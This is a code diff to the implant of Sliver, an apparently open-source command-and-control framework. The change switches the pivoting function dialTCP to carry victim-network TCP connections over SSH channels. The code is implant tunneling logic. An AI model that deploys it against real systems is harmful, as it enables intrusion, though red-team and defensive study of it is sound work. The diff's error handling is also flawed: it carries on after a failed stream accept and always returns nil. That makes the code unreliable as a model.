@@ -23,26 +23,29 @@ import (
 	"log"
 	// {{end}}
 
-	"io"
 	"net"
 
-	"github.com/bishopfox/sliver/protobuf/sliverpb"
+	"golang.org/x/crypto/ssh"
+
+	"github.com/bishopfox/sliver/protobuf/commpb"
 )
 
 // dialTCP - A connection coming from the server is destined to one of the implant's networks.
 // Forge local and/or remote TCP addresses and pass them to the dialer. Pipe the connection.
-func dialTCP(info *sliverpb.ConnectionInfo, src io.ReadWriteCloser) error {
+func dialTCP(info *commpb.Conn, ch ssh.NewChannel) error {
 
-	// When the source address:port is specified, use it.
-	var srcAddr *net.TCPAddr
-	if info.LHost != "" || info.LPort == 0 {
-		srcAddr = &net.TCPAddr{
-			IP:   net.ParseIP(info.LHost),
-			Port: int(info.LPort),
-		}
-	}
+	// Use the corresponding source address if available.
+	// Commented out now for testing purposes on a local machine.
+	var laddr *net.TCPAddr
+	// if info.LHost != "" && info.LPort != 0 {
+	//         ip := net.ParseIP(info.LHost)
+	//         if ip != nil {
+	//                 laddr = &net.TCPAddr{IP: ip, Port: int(info.LPort)}
+	//         }
+	// }
+
 	// We need the destination anyway.
-	dstAddr := &net.TCPAddr{
+	raddr := &net.TCPAddr{
 		IP:   net.ParseIP(info.RHost),
 		Port: int(info.RPort),
 	}
@@ -51,13 +54,30 @@ func dialTCP(info *sliverpb.ConnectionInfo, src io.ReadWriteCloser) error {
 	log.Printf("Dialing TCP on %s:%d", info.RHost, info.RPort)
 	// {{end}}
 
-	// Get a conn and pipe -->
-	dst, err := net.DialTCP("tcp", srcAddr, dstAddr)
+	// Get a conn to destination.
+	dst, err := net.DialTCP("tcp", laddr, raddr)
 	if err != nil {
 		// We should return an error to the server.
 		return err
 	}
-	transport(src, dst)
 
-	return err
+	// Accept stream and pipe
+	src, reqs, err := ch.Accept()
+	if err != nil {
+		if err != nil {
+			// {{if .Config.Debug}}
+			log.Printf("failed to accept stream (ID %s): %s", info.ID, err.Error())
+			// {{end}}
+		}
+	}
+	go ssh.DiscardRequests(reqs)
+
+	// Pipe connections. Blocking until EOF or any other error
+	transportConn(src, dst)
+
+	// Close connections once we're done, with a delay left so our
+	// custom RPC tunnel has time to transmit the remaining data.
+	closeConnections(src, dst)
+
+	return nil
 }
